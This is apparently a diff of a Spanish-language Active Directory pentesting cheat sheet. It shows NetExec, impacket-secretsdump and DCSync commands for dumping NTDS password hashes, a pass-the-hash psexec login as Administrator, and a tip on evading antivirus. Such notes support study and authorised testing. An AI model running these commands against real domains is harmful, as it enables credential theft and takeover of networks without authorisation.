@@ -45,7 +45,7 @@ Es común que estos archivos sean el objetivo principal de herramientas de extra
 ```powershell
 # Comando para usuarios con altos privilegios 
 
-❯ nxc smb 3.14.245.175 -u "admin" -p "Password@1" -d "domain1.corp" --ntds   # Nos muestra loas hashes de los usuarios, por lo que se puede hacer 'Pass-The-Hash'
+❯ nxc smb IP -u "admin" -p "Password@1" -d "domain1.corp" --ntds   # Nos muestra loas hashes de los usuarios, por lo que se puede hacer 'Pass-The-Hash'
 ```
 
 ## Utilizando Mimikatz
@@ -65,6 +65,7 @@ Es común que estos archivos sean el objetivo principal de herramientas de extra
 ## Utilizando Impacket-secretsdump
 
 ```powershell
+❯ impacket-secretsdump domain1.corp/user@IP-DC 
 ❯ impacket-secretsdump -debug -dc-ip <IP> admin@domain1.corp -hashes :64fbae31cc352fc26af97cbdef151e03 
 	
 	# debug = Obtener mas info 
@@ -74,9 +75,10 @@ Es común que estos archivos sean el objetivo principal de herramientas de extra
 
 Notas: 
 	1. Es mejor hacer un 'Pass-The-Hash' con el 'aes256' que con el 'rc4' ya que los AV los detectan más fácil 
+	2. Tener credenciales validas para que funcione 
 ```
 
-## DCSync 
+## Ejemplo DCSync
 
 ```powershell
 1. Si se esta en el grupo 'Account Operators' con 'GenericAll' sobre 'Exchange Windows Permissions' se puede crear un usuario y agregarlo al grupo
@@ -106,6 +108,7 @@ Notas:
 4. Hacer DCSync desde Kali 
 
 ❯ impacket-secretsdump domain1.local/user@IP-DC    # Ejecutar el DCSync con el usuario creado
+	# IP-DC = La dirección IP del DC  
 
 ❯ impacket-psexec domain1.local/Administrator@IP cmd.exe -hashes :hash   # Utilizar 'psexec' para ingresar con el usuario 'Administrator' haciendo 'Pass-The-Hash'    
 ```
